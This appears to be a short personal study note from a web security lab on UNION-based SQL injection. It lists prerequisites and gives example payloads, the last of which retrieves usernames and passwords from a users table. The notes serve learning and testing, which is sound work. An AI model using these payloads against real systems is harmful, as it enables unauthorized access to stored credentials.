---
title: Using SQLi UNION to Retrieve interesting Data
updated: 2022-12-01T10:21:11.0000000+04:00
created: 2022-11-30T08:31:56.0000000+04:00
---

Using SQLi UNION to Retrieve interesting Data
Wednesday, November 30, 2022
8:31 AM
**<u>Condition for this step:</u>**

1.  Determined the number of columns:
2.  Found what column can hold string data
3.  You have found the database name
4.  You have found table names
5.  You have found column names from a table

**<u>Example:</u>**

1.  Let's say you found 2 columns that can hold string (text) data:

**Step 1: Identify the number of columns**

- ' UNION SELECT NULL,NULL--

**Step 2: Identify which column can hold string data**

- ' UNION SELECT 'a','a'--

2.  Once you have identified that 2 columns can hold the string data you can proceed by inputting the following query.

- ' UNION SELECT username, password FROM users--

***<u>Results from the LAB</u>***

![image1](image1-188.png)
